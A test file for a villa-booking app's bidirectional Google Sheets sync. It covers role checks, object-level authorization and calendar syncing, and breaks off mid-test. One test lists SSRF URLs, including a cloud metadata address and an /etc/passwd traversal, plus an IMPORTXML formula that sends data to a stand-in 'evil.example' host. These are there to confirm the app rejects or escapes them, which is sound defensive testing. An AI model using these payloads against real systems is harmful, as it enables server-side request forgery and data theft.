const assert = require("node:assert/strict");
const { after, afterEach, beforeEach, describe, it } = require("node:test");
const request = require("supertest");
const { Op } = require("sequelize");

import type { PatchEntry } from "./helpers/types";
import type {
    GoogleSheetsTransport,
    RawDeveloperMetadata,
    RawSheetCell,
    RawSheetTab,
    RawSpreadsheetResponse,
} from "../src/services/google-sheets-client.service";

process.env.NODE_ENV = "test";
process.env.JWT_SECRET_KEY = "test-secret";
process.env.ACCESS_TOKEN_TTL_MINUTES = "15";

const { ApiError } = require("../dist/common/api-error");
const sequelize = require("../dist/config/database").default || require("../dist/config/database").sequelize;
const AvailabilityCalendar = require("../dist/models/availability-calendar").default;
const Booking = require("../dist/models/booking").default;
const HostSheetCellSnapshot = require("../dist/models/host-sheet-cell-snapshot").default;
const HostSheetChangeLog = require("../dist/models/host-sheet-change-log").default;
const HostSheetIntegration = require("../dist/models/host-sheet-integration").default;
const HostSheetSyncConflict = require("../dist/models/host-sheet-sync-conflict").default;
const HostSheetSyncJob = require("../dist/models/host-sheet-sync-job").default;
const Listing = require("../dist/models/listing").default;
const User = require("../dist/models/user").default;

const authService = require("../dist/modules/auth/auth.service");
const auditLogService = require("../dist/services/audit-log-service");
const semanticSearchIndexer = require("../dist/modules/semantic-search/semantic-search.indexer");
const hostVerificationStatusService = require("../dist/services/host-verification-status-service");
const notificationService = require("../dist/modules/notifications/notification.service");
const bookingDateLockService = require("../dist/services/booking-date-lock.service");
const googleSheetsClient = require("../dist/services/google-sheets-client.service");
const hostSheetLayout = require("../dist/modules/host-sheet-sync/host-sheet-sync.layout");
const hostSheetSyncService = require("../dist/modules/host-sheet-sync/host-sheet-sync.service");
const hostSheetSyncWorker = require("../dist/modules/host-sheet-sync/host-sheet-sync.worker");

const {
    GoogleSheetsClientError,
    SHEET_COLORS,
    classifySheetCalendarCell,
    resetGoogleSheetsTransportForTesting,
    rgbToHex,
    sanitizeSheetTextValue,
    setGoogleSheetsTransportForTesting,
} = googleSheetsClient;

const originals: PatchEntry[] = [];

const patch = (target: Record<string, unknown>, key: string, value: unknown): void => {
    originals.push([target, key, target[key]]);
    target[key] = value;
};

type InMemoryTab = {
    sheetId: number;
    title: string;
    index: number;
    rowCount: number;
    columnCount: number;
    frozenRowCount: number;
    frozenColumnCount: number;
    developerMetadata: RawDeveloperMetadata[];
    protectedRanges: Array<{ protectedRangeId: number; description?: string; warningOnly?: boolean }>;
    rows: Map<number, RawSheetCell[]>;
    rowDeveloperMetadata: Map<number, RawDeveloperMetadata[]>;
};

type InMemorySpreadsheet = {
    spreadsheetId: string;
    title: string;
    developerMetadata: RawDeveloperMetadata[];
    tabs: InMemoryTab[];
};

class FakeGoogleSheetsTransport implements GoogleSheetsTransport {
    public spreadsheets = new Map<string, InMemorySpreadsheet>();
    public serviceAccountEmail = "villa-sync-bot@agency-sheets.iam.gserviceaccount.com";
    public nextGetError: InstanceType<typeof GoogleSheetsClientError> | null = null;
    public nextBatchUpdateError: InstanceType<typeof GoogleSheetsClientError> | null = null;
    public recordedGetFields: string[] = [];
    public recordedUpdateCellsFields: string[] = [];
    private nextMetaId = 5000;
    private nextSheetId = 100;

    createBlankSpreadsheet(spreadsheetId: string, title = "Lịch Villa Agency"): InMemorySpreadsheet {
        const sheet: InMemorySpreadsheet = {
            spreadsheetId,
            title,
            developerMetadata: [],
            tabs: [
                {
                    sheetId: 0,
                    title: "Sheet1",
                    index: 0,
                    rowCount: 200,
                    columnCount: 35,
                    frozenRowCount: 0,
                    frozenColumnCount: 0,
                    developerMetadata: [],
                    protectedRanges: [],
                    rows: new Map(),
                    rowDeveloperMetadata: new Map(),
                },
            ],
        };
        this.spreadsheets.set(spreadsheetId, sheet);
        return sheet;
    }

    async getServiceAccountEmail(): Promise<string | null> {
        return this.serviceAccountEmail;
    }

    async getSpreadsheet(params: {
        spreadsheetId: string;
        ranges?: string[];
        includeGridData?: boolean;
        fields?: string;
    }): Promise<RawSpreadsheetResponse> {
        if (params.fields) {
            this.recordedGetFields.push(params.fields);
        }
        if (this.nextGetError) {
            const err = this.nextGetError;
            this.nextGetError = null;
            throw err;
        }
        const doc = this.spreadsheets.get(params.spreadsheetId);
        if (!doc) {
            throw new GoogleSheetsClientError("SPREADSHEET_NOT_FOUND", "Không tìm thấy bảng tính", {
                httpStatus: 404,
            });
        }

        const requestedTitles = new Set<string>();
        if (params.ranges && params.ranges.length > 0) {
            for (const r of params.ranges) {
                const bangIdx = r.lastIndexOf("!");
                if (bangIdx > 0) {
                    const rawTitle = r.slice(0, bangIdx).replace(/^'|'$/g, "").replace(/''/g, "'");
                    requestedTitles.add(rawTitle);
                }
            }
        }

        const stripEffectiveFormat = Boolean(params.fields && !params.fields.includes("effectiveFormat"));

        const sheets: RawSheetTab[] = doc.tabs
            .filter((t) => requestedTitles.size === 0 || requestedTitles.has(t.title))
            .sort((a, b) => a.index - b.index)
            .map((t) => {
                const baseTab: RawSheetTab = {
                    properties: {
                        sheetId: t.sheetId,
                        title: t.title,
                        index: t.index,
                        gridProperties: {
                            rowCount: t.rowCount,
                            columnCount: t.columnCount,
                            frozenRowCount: t.frozenRowCount,
                            frozenColumnCount: t.frozenColumnCount,
                        },
                    },
                    developerMetadata: [...t.developerMetadata],
                    protectedRanges: [...t.protectedRanges],
                };

                if (params.includeGridData) {
                    let maxRow = -1;
                    for (const rIdx of t.rows.keys()) {
                        if (rIdx > maxRow) maxRow = rIdx;
                    }
                    for (const rIdx of t.rowDeveloperMetadata.keys()) {
                        if (rIdx > maxRow) maxRow = rIdx;
                    }

                    const rowData: Array<{ values?: RawSheetCell[] }> = [];
                    const rowMetadata: Array<{ developerMetadata?: RawDeveloperMetadata[] }> = [];
                    for (let r = 0; r <= Math.max(maxRow, 1); r += 1) {
                        const cells = t.rows.get(r);
                        rowData.push({
                            values: cells
                                ? cells.map((cell) => {
                                      if (!cell) return {};
                                      const cloned: RawSheetCell = JSON.parse(JSON.stringify(cell));
                                      if (stripEffectiveFormat) {
                                          delete cloned.effectiveFormat;
                                      }
                                      return cloned;
                                  })
                                : [],
                        });
                        rowMetadata.push({
                            developerMetadata: [...(t.rowDeveloperMetadata.get(r) ?? [])],
                        });
                    }

                    baseTab.data = [
                        {
                            startRow: 0,
                            startColumn: 0,
                            rowData,
                            rowMetadata,
                        },
                    ];
                }

                return baseTab;
            });

        return {
            spreadsheetId: doc.spreadsheetId,
            properties: {
                title: doc.title,
                timeZone: "Asia/Ho_Chi_Minh",
            },
            developerMetadata: [...doc.developerMetadata],
            sheets,
        };
    }

    async batchUpdate(params: {
        spreadsheetId: string;
        requests: Array<Record<string, unknown>>;
    }): Promise<Record<string, unknown>> {
        if (this.nextBatchUpdateError) {
            const err = this.nextBatchUpdateError;
            this.nextBatchUpdateError = null;
            throw err;
        }
        const doc = this.spreadsheets.get(params.spreadsheetId);
        if (!doc) {
            throw new GoogleSheetsClientError("SPREADSHEET_NOT_FOUND", "Không tìm thấy bảng tính", {
                httpStatus: 404,
            });
        }

        for (const req of params.requests) {
            if (req.addSheet) {
                const props = (req.addSheet as any).properties ?? {};
                const sheetId = props.sheetId ?? this.nextSheetId++;
                const gridProps = props.gridProperties ?? {};
                doc.tabs.push({
                    sheetId,
                    title: props.title ?? `Sheet${sheetId}`,
                    index: props.index ?? doc.tabs.length,
                    rowCount: gridProps.rowCount ?? 200,
                    columnCount: gridProps.columnCount ?? 33,
                    frozenRowCount: gridProps.frozenRowCount ?? 0,
                    frozenColumnCount: gridProps.frozenColumnCount ?? 0,
                    developerMetadata: [],
                    protectedRanges: [],
                    rows: new Map(),
                    rowDeveloperMetadata: new Map(),
                });
            } else if (req.updateSheetProperties) {
                const props = (req.updateSheetProperties as any).properties ?? {};
                const tab = doc.tabs.find((t) => t.sheetId === props.sheetId);
                if (tab) {
                    if (props.title !== undefined) tab.title = props.title;
                    if (props.gridProperties?.frozenRowCount !== undefined) {
                        tab.frozenRowCount = props.gridProperties.frozenRowCount;
                    }
                    if (props.gridProperties?.frozenColumnCount !== undefined) {
                        tab.frozenColumnCount = props.gridProperties.frozenColumnCount;
                    }
                }
            } else if (req.appendDimension) {
                const ad = req.appendDimension as any;
                const tab = doc.tabs.find((t) => t.sheetId === ad.sheetId);
                if (tab && ad.dimension === "ROWS") {
                    tab.rowCount += Number(ad.length ?? 0);
                }
            } else if (req.createDeveloperMetadata) {
                const dm = (req.createDeveloperMetadata as any).developerMetadata as RawDeveloperMetadata;
                const entry: RawDeveloperMetadata = {
                    metadataId: dm.metadataId ?? this.nextMetaId++,
                    metadataKey: dm.metadataKey,
                    metadataValue: dm.metadataValue,
                    visibility: dm.visibility ?? "DOCUMENT",
                    location: dm.location,
                };
                if (dm.location?.spreadsheet) {
                    doc.developerMetadata = doc.developerMetadata.filter((m) => m.metadataId !== entry.metadataId);
                    doc.developerMetadata.push(entry);
                } else if (dm.location?.sheetId !== undefined) {
                    const tab = doc.tabs.find((t) => t.sheetId === dm.location!.sheetId);
                    if (tab) {
                        tab.developerMetadata = tab.developerMetadata.filter(
                            (m) => m.metadataKey !== entry.metadataKey,
                        );
                        tab.developerMetadata.push(entry);
                    }
                } else if (dm.location?.dimensionRange?.dimension === "ROWS") {
                    const range = dm.location.dimensionRange;
                    const tab = doc.tabs.find((t) => t.sheetId === range.sheetId);
                    if (tab && range.startIndex !== undefined) {
                        const existing = (tab.rowDeveloperMetadata.get(range.startIndex) ?? []).filter(
                            (m) => m.metadataKey !== entry.metadataKey,
                        );
                        existing.push(entry);
                        tab.rowDeveloperMetadata.set(range.startIndex, existing);
                    }
                }
            } else if (req.deleteDeveloperMetadata) {
                const lookup = (req.deleteDeveloperMetadata as any).dataFilter?.developerMetadataLookup;
                if (lookup?.metadataId !== undefined) {
                    doc.developerMetadata = doc.developerMetadata.filter(
                        (m) => m.metadataId !== lookup.metadataId,
                    );
                }
            } else if (req.addProtectedRange) {
                const pr = (req.addProtectedRange as any).protectedRange;
                const sheetId = pr?.range?.sheetId;
                const tab = doc.tabs.find((t) => t.sheetId === sheetId);
                if (tab) {
                    tab.protectedRanges.push({
                        protectedRangeId: this.nextMetaId++,
                        description: pr.description,
                        warningOnly: pr.warningOnly,
                    });
                }
            } else if (req.updateCells) {
                const uc = req.updateCells as any;
                if (typeof uc.fields === "string") {
                    this.recordedUpdateCellsFields.push(uc.fields);
                }
                const range = uc.range ?? {};
                const tab = doc.tabs.find((t) => t.sheetId === range.sheetId);
                if (tab) {
                    const startRow = Number(range.startRowIndex ?? 0);
                    const startCol = Number(range.startColumnIndex ?? 0);
                    const inputRows: Array<{ values?: RawSheetCell[] }> = uc.rows ?? [];
                    for (let rOffset = 0; rOffset < inputRows.length; rOffset += 1) {
                        const rowIdx = startRow + rOffset;
                        const rowArr = tab.rows.get(rowIdx) ?? [];
                        const values = inputRows[rOffset]?.values ?? [];
                        for (let cOffset = 0; cOffset < values.length; cOffset += 1) {
                            const colIdx = startCol + cOffset;
                            rowArr[colIdx] = JSON.parse(JSON.stringify(values[cOffset] ?? {}));
                        }
                        tab.rows.set(rowIdx, rowArr);
                    }
                }
            }
        }

        return { spreadsheetId: doc.spreadsheetId, replies: [] };
    }

    findMonthTab(spreadsheetId: string, monthTabKey: string): InMemoryTab | undefined {
        const doc = this.spreadsheets.get(spreadsheetId);
        if (!doc) return undefined;
        return (
            doc.tabs.find((t) =>
                t.developerMetadata.some(
                    (m) => m.metadataKey === "agy_month_tab" && m.metadataValue === monthTabKey,
                ),
            ) ?? doc.tabs.find((t) => t.title === monthTabKey)
        );
    }

    findListingRowIndex(tab: InMemoryTab, listingId: number): number {
        for (const [rIdx, cells] of tab.rows.entries()) {
            if (rIdx < 2) continue;
            const colA = cells[0]?.userEnteredValue?.stringValue;
            if (colA === String(listingId)) {
                return rIdx;
            }
        }
        return -1;
    }

    paintHostDay(
        spreadsheetId: string,
        monthTabKey: string,
        listingId: number,
        day: number,
        options: {
            text?: string;
            bgColor?: { red: number; green: number; blue: number } | null;
            effectiveBgColor?: { red: number; green: number; blue: number };
        },
    ): void {
        const tab = this.findMonthTab(spreadsheetId, monthTabKey);
        if (!tab) {
            throw new Error(`Expected month tab ${monthTabKey} to exist`);
        }
        const rIdx = this.findListingRowIndex(tab, listingId);
        assert.ok(rIdx >= 2, `Expected row for listing ${listingId} in ${monthTabKey}`);
        const row = tab.rows.get(rIdx) ?? [];
        const colIdx = 2 + (day - 1);
        const cell: RawSheetCell = {};
        if (options.text !== undefined) {
            cell.userEnteredValue = options.text ? { stringValue: options.text } : {};
        }
        if (options.bgColor !== undefined) {
            cell.userEnteredFormat = options.bgColor
                ? { backgroundColorStyle: { rgbColor: options.bgColor } }
                : { backgroundColorStyle: { rgbColor: SHEET_COLORS.WHITE } };
        }
        if (options.effectiveBgColor) {
            cell.effectiveFormat = {
                backgroundColor: options.effectiveBgColor,
                backgroundColorStyle: { rgbColor: options.effectiveBgColor },
            };
        }
        row[colIdx] = cell;
        tab.rows.set(rIdx, row);
    }
}

const matchesCondition = (actual: any, expected: any): boolean => {
    if (expected === undefined) return true;
    if (expected === null) return actual === null || actual === undefined;
    if (typeof expected === "object" && !Array.isArray(expected) && !(expected instanceof Date)) {
        const symbols = Object.getOwnPropertySymbols(expected);
        if (symbols.length > 0) {
            for (const sym of symbols) {
                const condVal = expected[sym];
                if (sym === Op.in) {
                    if (!Array.isArray(condVal) || !condVal.some((v) => String(v) === String(actual))) {
                        return false;
                    }
                } else if (sym === Op.gte) {
                    if (actual === null || actual === undefined) return false;
                    if (condVal instanceof Date || actual instanceof Date) {
                        if (new Date(actual).getTime() < new Date(condVal).getTime()) return false;
                    } else if (String(actual) < String(condVal)) {
                        return false;
                    }
                } else if (sym === Op.lte) {
                    if (actual === null || actual === undefined) return false;
                    if (condVal instanceof Date || actual instanceof Date) {
                        if (new Date(actual).getTime() > new Date(condVal).getTime()) return false;
                    } else if (String(actual) > String(condVal)) {
                        return false;
                    }
                } else if (sym === Op.gt) {
                    if (actual === null || actual === undefined) return false;
                    if (condVal instanceof Date || actual instanceof Date) {
                        if (new Date(actual).getTime() <= new Date(condVal).getTime()) return false;
                    } else if (String(actual) <= String(condVal)) {
                        return false;
                    }
                } else if (sym === Op.lt) {
                    if (actual === null || actual === undefined) return false;
                    if (condVal instanceof Date || actual instanceof Date) {
                        if (new Date(actual).getTime() >= new Date(condVal).getTime()) return false;
                    } else if (String(actual) >= String(condVal)) {
                        return false;
                    }
                } else if (sym === Op.ne) {
                    if (actual === condVal) return false;
                }
            }
            return true;
        }
    }
    if (expected instanceof Date || actual instanceof Date) {
        if (!actual || !expected) return actual === expected;
        return new Date(actual).getTime() === new Date(expected).getTime();
    }
    return String(actual) === String(expected);
};

const matchesWhere = (record: Record<string, any>, where: Record<any, any> | undefined): boolean => {
    if (!where) return true;
    const orBranches = where[Op.or];
    if (Array.isArray(orBranches)) {
        const orMatched = orBranches.some((branch) => matchesWhere(record, branch));
        if (!orMatched) return false;
    }
    const andBranches = where[Op.and];
    if (Array.isArray(andBranches)) {
        const andMatched = andBranches.every((branch) => matchesWhere(record, branch));
        if (!andMatched) return false;
    }
    for (const [key, expected] of Object.entries(where)) {
        if (!matchesCondition(record[key], expected)) {
            return false;
        }
    }
    return true;
};

describe("Google Sheets Agency Mode — Bidirectional Sync, RBAC, Safety & Edge Cases", () => {
    let app: any;
    let fakeSheets: FakeGoogleSheetsTransport;

    let integrationsStore: any[];
    let jobsStore: any[];
    let snapshotsStore: any[];
    let conflictsStore: any[];
    let logsStore: any[];
    let listingsStore: any[];
    let calendarStore: any[];
    let bookingsStore: any[];
    let nextIds: Record<string, number>;

    const adminUser = {
        id: "1",
        userId: 1,
        email: "admin@example.com",
        phone: "0900000001",
        fullName: "System Admin",
        username: "admin",
        status: "active",
        roles: ["admin"],
    };

    const hostA = {
        id: "101",
        userId: 101,
        email: "athanhnee@gmail.com",
        phone: "0900000101",
        fullName: "Host Agency A",
        username: "host_a",
        status: "active",
        roles: ["host"],
    };

    const hostB = {
        id: "102",
        userId: 102,
        email: "hostb@example.com",
        phone: "0900000102",
        fullName: "Host Agency B",
        username: "host_b",
        status: "active",
        roles: ["host"],
    };

    const guestUser = {
        id: "201",
        userId: 201,
        email: "guest@example.com",
        phone: "0900000201",
        fullName: "Guest User",
        username: "guest_user",
        status: "active",
        roles: ["guest"],
    };

    const hostAAuth = { Authorization: "Bearer host-a-token" };
    const hostBAuth = { Authorization: "Bearer host-b-token" };
    const adminAuth = { Authorization: "Bearer admin-token" };
    const guestAuth = { Authorization: "Bearer guest-token" };

    const sheetIdA = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789HostA";
    const sheetUrlA = `https://docs.google.com/spreadsheets/d/${sheetIdA}/edit#gid=0`;

    const makeRecord = (store: any[], pkField: string, data: Record<string, any>) => {
        const now = new Date();
        const rec: Record<string, any> = {
            createdAt: data.createdAt ?? now,
            updatedAt: data.updatedAt ?? now,
            ...data,
            get(opts?: { plain?: boolean }) {
                if (opts?.plain) {
                    const copy = { ...this };
                    delete copy.save;
                    delete copy.destroy;
                    delete copy.get;
                    return copy;
                }
                return this;
            },
            async save() {
                this.updatedAt = new Date();
                if (!store.includes(this)) {
                    store.push(this);
                }
                return this;
            },
            async destroy() {
                const idx = store.indexOf(this);
                if (idx >= 0) {
                    store.splice(idx, 1);
                }
            },
        };
        if (rec[pkField] === undefined) {
            nextIds[pkField] = (nextIds[pkField] ?? 1) + 1;
            rec[pkField] = nextIds[pkField];
        }
        store.push(rec);
        return rec;
    };

    const wireInMemoryModel = (model: any, storeGetter: () => any[], pkField: string) => {
        patch(model, "findOne", async (opts: any = {}) => {
            const matches = storeGetter().filter((item) => matchesWhere(item, opts.where));
            return matches[0] ?? null;
        });
        patch(model, "findByPk", async (pk: any) => {
            return storeGetter().find((item) => String(item[pkField]) === String(pk)) ?? null;
        });
        patch(model, "findAll", async (opts: any = {}) => {
            let matches = storeGetter().filter((item) => matchesWhere(item, opts.where));
            if (typeof opts.offset === "number") {
                matches = matches.slice(opts.offset);
            }
            if (typeof opts.limit === "number") {
                matches = matches.slice(0, opts.limit);
            }
            return matches;
        });
        patch(model, "count", async (opts: any = {}) => {
            return storeGetter().filter((item) => matchesWhere(item, opts.where)).length;
        });
        patch(model, "findAndCountAll", async (opts: any = {}) => {
            const all = storeGetter().filter((item) => matchesWhere(item, opts.where));
            const offset = Number(opts.offset ?? 0);
            const limit = Number(opts.limit ?? all.length);
            return {
                count: all.length,
                rows: all.slice(offset, offset + limit),
            };
        });
        patch(model, "create", async (values: Record<string, any>) => {
            return makeRecord(storeGetter(), pkField, values);
        });
        patch(model, "update", async (updates: Record<string, any>, opts: any = {}) => {
            const matched = storeGetter().filter((item) => matchesWhere(item, opts.where));
            for (const item of matched) {
                Object.assign(item, updates, { updatedAt: new Date() });
            }
            return [matched.length];
        });
        patch(model, "destroy", async (opts: any = {}) => {
            const store = storeGetter();
            const matched = store.filter((item) => matchesWhere(item, opts.where));
            for (const item of matched) {
                const idx = store.indexOf(item);
                if (idx >= 0) store.splice(idx, 1);
            }
            return matched.length;
        });
    };

    beforeEach(() => {
        process.env.HOST_SHEET_SYNC_TEST_ENABLED = "true";
        fakeSheets = new FakeGoogleSheetsTransport();
        fakeSheets.createBlankSpreadsheet(sheetIdA, "Lịch Villa Vũng Tàu - Host A");
        setGoogleSheetsTransportForTesting(fakeSheets);

        integrationsStore = [];
        jobsStore = [];
        snapshotsStore = [];
        conflictsStore = [];
        logsStore = [];
        listingsStore = [];
        calendarStore = [];
        bookingsStore = [];
        nextIds = {
            integrationId: 10,
            jobId: 100,
            snapshotId: 1000,
            conflictId: 500,
            logId: 2000,
            calendarId: 3000,
            listingId: 800,
            bookingId: 9000,
        };

        // Seed 2 active listings for Host A
        makeRecord(listingsStore, "listingId", {
            listingId: 801,
            hostId: 101,
            title: "Villa Bãi Sau 5PN",
            description: "Villa nghỉ dưỡng sát biển Bãi Sau",
            addressLine: "100 Thùy Vân",
            ward: "Phường 2",
            district: "TP Vũng Tàu",
            city: "Bà Rịa - Vũng Tàu",
            propertyType: "villa",
            roomType: "entire_place",
            maxGuests: 12,
            bedrooms: 5,
            beds: 6,
            bathrooms: 5,
            basePrice: 4500000,
            currency: "VND",
            minNights: 1,
            maxNights: 30,
            status: "active",
            deletedAt: null,
            createdAt: new Date("2026-01-10T00:00:00.000Z"),
        });

        makeRecord(listingsStore, "listingId", {
            listingId: 802,
            hostId: 101,
            title: "Homestay Hồ Bơi 3PN",
            description: "Homestay ấm cúng trung tâm",
            addressLine: "25 Phan Chu Trinh",
            ward: "Phường 2",
            district: "TP Vũng Tàu",
            city: "Bà Rịa - Vũng Tàu",
            propertyType: "house",
            roomType: "entire_place",
            maxGuests: 8,
            bedrooms: 3,
            beds: 4,
            bathrooms: 3,
            basePrice: 2800000,
            currency: "VND",
            minNights: 1,
            maxNights: 30,
            status: "active",
            deletedAt: null,
            createdAt: new Date("2026-01-12T00:00:00.000Z"),
        });

        app = require("../dist/app").default;

        const usersMap = new Map<string, any>([
            ["1", adminUser],
            ["101", hostA],
            ["102", hostB],
            ["201", guestUser],
        ]);

        patch(authService, "verifyAuthToken", (token: string) => {
            if (token === "admin-token") return { userId: "1", role: "admin" };
            if (token === "host-a-token") return { userId: "101", role: "host" };
            if (token === "host-b-token") return { userId: "102", role: "host" };
            if (token === "guest-token") return { userId: "201", role: "guest" };
            throw new ApiError(401, "Unauthorized");
        });

        patch(authService, "toAuthenticatedUser", async (user: any) => ({
            id: String(user.id || user.userId),
            email: user.email,
            phone: user.phone,
            name: user.fullName,
            username: user.username,
            status: user.status || "active",
            roles: user.roles || ["guest"],
        }));

        patch(User, "findByPk", async (id: string | number) => usersMap.get(String(id)) ?? null);
        patch(User, "findOne", async ({ where }: any) => {
            const id = where?.id || where?.userId;
            return usersMap.get(String(id)) ?? null;
        });

        wireInMemoryModel(HostSheetIntegration, () => integrationsStore, "integrationId");
        wireInMemoryModel(HostSheetSyncJob, () => jobsStore, "jobId");
        wireInMemoryModel(HostSheetCellSnapshot, () => snapshotsStore, "snapshotId");
        wireInMemoryModel(HostSheetSyncConflict, () => conflictsStore, "conflictId");
        wireInMemoryModel(HostSheetChangeLog, () => logsStore, "logId");
        wireInMemoryModel(Listing, () => listingsStore, "listingId");
        wireInMemoryModel(AvailabilityCalendar, () => calendarStore, "calendarId");
        wireInMemoryModel(Booking, () => bookingsStore, "bookingId");

        patch(HostSheetCellSnapshot, "bulkCreate", async (rows: Array<Record<string, any>>) => {
            for (const row of rows) {
                const existing = snapshotsStore.find(
                    (s) => Number(s.listingId) === Number(row.listingId) && s.date === row.date,
                );
                if (existing) {
                    Object.assign(existing, row, { updatedAt: new Date() });
                } else {
                    makeRecord(snapshotsStore, "snapshotId", row);
                }
            }
            return snapshotsStore;
        });

        patch(sequelize, "transaction", async (arg1: any, arg2?: any) => {
            const callback = typeof arg1 === "function" ? arg1 : arg2;
            const afterCommitCallbacks: Array<() => void> = [];
            const tx = {
                LOCK: { UPDATE: "UPDATE" },
                afterCommit(fn: () => void) {
                    afterCommitCallbacks.push(fn);
                },
            };
            const res = await callback(tx);
            for (const fn of afterCommitCallbacks) {
                fn();
            }
            return res;
        });

        patch(sequelize, "query", async () => []);
        patch(auditLogService, "writeAuditLog", async () => ({}));
        patch(auditLogService, "createAuditLog", async () => ({}));
        patch(semanticSearchIndexer, "scheduleSemanticReindex", () => {});
        patch(hostVerificationStatusService, "isHostVerifiedForPublishing", async () => true);
        patch(notificationService, "notifyListingApproved", async () => {});
        patch(notificationService, "notifyListingRejected", async () => {});
    });

    afterEach(() => {
        resetGoogleSheetsTransportForTesting();
        delete process.env.HOST_SHEET_SYNC_TEST_ENABLED;
        while (originals.length > 0) {
            const [target, key, value] = originals.pop()!;
            target[key] = value;
        }
    });

    after(async () => {
        try {
            await sequelize.close();
        } catch {
            // ignore
        }
    });

    it("SS-01: Auth, RBAC (401 vs 403), BOLA conflict protection & unique spreadsheet_id per Host (409)", async () => {
        // 1. Unauthenticated -> 401
        const unauthRes = await request(app).get("/api/host/sheet-sync/status");
        assert.equal(unauthRes.status, 401);

        // 2. Authenticated Guest -> 403
        const guestRes = await request(app).get("/api/host/sheet-sync/status").set(guestAuth);
        assert.equal(guestRes.status, 403);

        // 3. Authenticated Admin on host-only sheet-sync route -> 403
        const adminRes = await request(app).get("/api/host/sheet-sync/status").set(adminAuth);
        assert.equal(adminRes.status, 403);

        // 4. Host A connects valid Spreadsheet -> 200
        const connectA = await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });
        assert.equal(connectA.status, 200);
        assert.equal(connectA.body.data.connected, true);
        assert.equal(connectA.body.data.defaultHostEditorEmail, "athanhnee@gmail.com");

        // 5. Host B tries to connect Host A's Spreadsheet -> 409 Conflict
        const connectB = await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostBAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });
        assert.equal(connectB.status, 409);

        // 6. Seed an open conflict belonging to Host A; Host B tries to resolve it -> 403 Forbidden (BOLA)
        const conflictA = makeRecord(conflictsStore, "conflictId", {
            conflictId: 777,
            hostUserId: 101,
            integrationId: integrationsStore[0].integrationId,
            listingId: 801,
            conflictType: "app_vs_sheet_concurrent",
            severity: "high",
            status: "open",
            description: "Xung đột lịch của Host A",
        });

        const bolaRes = await request(app)
            .post(`/api/host/sheet-sync/conflicts/${conflictA.conflictId}/resolve`)
            .set(hostBAuth)
            .send({ action: "keep_locked" });
        assert.equal(bolaRes.status, 403);
    });

    it("SS-02: SSRF URL allowlist enforcement & Formula Injection sanitization + TEXT listing_id", async () => {
        const maliciousUrls = [
            "http://169.254.169.254/latest/meta-data/",
            "https://evil.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789HostA/edit",
            "http://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789HostA/edit",
            "https://attacker:secret@docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789HostA/edit",
            "https://docs.google.com:8443/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789HostA/edit",
            "https://docs.google.com/spreadsheets/d/../../etc/passwd",
        ];

        for (const badUrl of maliciousUrls) {
            const res = await request(app)
                .post("/api/host/sheet-sync/connect")
                .set(hostAAuth)
                .send({ spreadsheetUrlOrId: badUrl });
            assert.equal(res.status, 422, `Expected 422 for malicious input: ${badUrl}`);
        }

        // Formula injection in listing title
        listingsStore[0].title = '=IMPORTXML("https://evil.example/steal","//a")';
        assert.equal(
            sanitizeSheetTextValue(listingsStore[0].title),
            '\'=IMPORTXML("https://evil.example/steal","//a")',
        );

        const connectRes = await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });
        assert.equal(connectRes.status, 200);

        const rolling = hostSheetLayout.buildRollingMonthSpecs(
            new Date().toISOString().slice(0, 10),
            6,
        );
        const firstTab = fakeSheets.findMonthTab(sheetIdA, rolling[0].tabKey)!;
        const row801Idx = fakeSheets.findListingRowIndex(firstTab, 801);
        assert.ok(row801Idx >= 2);
        const row801 = firstTab.rows.get(row801Idx)!;

        // Col A must be plain TEXT string "801"
        assert.equal(row801[0].userEnteredValue?.stringValue, "801");
        assert.equal(row801[0].userEnteredFormat?.numberFormat?.type, "TEXT");
        // Col B title must be escaped with leading apostrophe so Google Sheets never executes formula
        assert.ok(row801[1].userEnteredValue?.stringValue?.startsWith("'="));
    });

    it("SS-03 & SS-04: Real Editor write check (403 on read-only) & idempotent init-calendar preserves Host Red blocks", async () => {
        // Simulate read-only viewer permission: GET works, batchUpdate returns 403 PERMISSION_DENIED
        fakeSheets.nextBatchUpdateError = new GoogleSheetsClientError(
            "PERMISSION_DENIED",
            "Chưa có quyền Chỉnh sửa (Editor) trên Google Sheets",
            { httpStatus: 403 },
        );

        const readOnlyRes = await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });
        assert.equal(readOnlyRes.status, 403);
        assert.equal(
            readOnlyRes.body.details?.[0]?.serviceAccountEmail,
            fakeSheets.serviceAccountEmail,
        );

        // Grant Editor -> connect succeeds & builds DANH MỤC CĂN + 6 rolling months with frozen 2 rows/cols
        const connectOk = await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });
        assert.equal(connectOk.status, 200);

        const doc = fakeSheets.spreadsheets.get(sheetIdA)!;
        const dirTab = doc.tabs.find((t) => t.title === "DANH MỤC CĂN");
        assert.ok(dirTab, "DANH MỤC CĂN tab must be created");

        const rolling = hostSheetLayout.buildRollingMonthSpecs(
            new Date().toISOString().slice(0, 10),
            6,
        );
        const targetMonth = rolling[1]; // Next month (guaranteed all days in the future!)
        const monthTab = fakeSheets.findMonthTab(sheetIdA, targetMonth.tabKey)!;
        assert.equal(monthTab.frozenRowCount, 2);
        assert.equal(monthTab.frozenColumnCount, 2);
        assert.ok(monthTab.protectedRanges.some((p) => p.warningOnly === true));

        // Host paints Day 15 Red ("Bảo trì hồ bơi") on Sheet
        fakeSheets.paintHostDay(sheetIdA, targetMonth.tabKey, 801, 15, {
            text: "Bảo trì hồ bơi",
            bgColor: SHEET_COLORS.HOST_BLOCKED_RED,
        });

        const syncRes = await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);
        assert.equal(syncRes.status, 200);

        const targetIsoDate = hostSheetLayout.formatIsoDate(targetMonth.year, targetMonth.month, 15);
        const lockedCal = calendarStore.find(
